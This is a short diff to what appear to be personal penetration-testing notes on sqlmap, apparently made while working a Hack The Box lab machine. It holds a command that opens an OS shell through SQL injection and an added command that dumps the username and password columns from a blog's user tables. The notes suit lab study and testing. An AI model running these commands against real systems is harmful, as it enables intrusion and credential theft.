@@ -34,6 +34,18 @@ To obtain a reverse shell we can use:
 sqlmap -u <URL> --data '{"<FIELD>": "*" }' --threads <NUMBER> --os-shell --batch
 ```
 
+More examples
+
+```
+sqlmap -D usage_blog --threads 10 -T admin_users,users -C username,password --batch --dump -r ~/Documents/Proyectos/hack-the-box/machines/usage/req_password --ignore-code 401
+```
+
+Where:
+
+- `-D` DBMS database to enumerate
+- `-T` DBMS database tables to enumerate
+- `-C` DBMS database table columns to enumerate
+
 And we can use a request file to avoid the need of the URL:
 
 ```bash
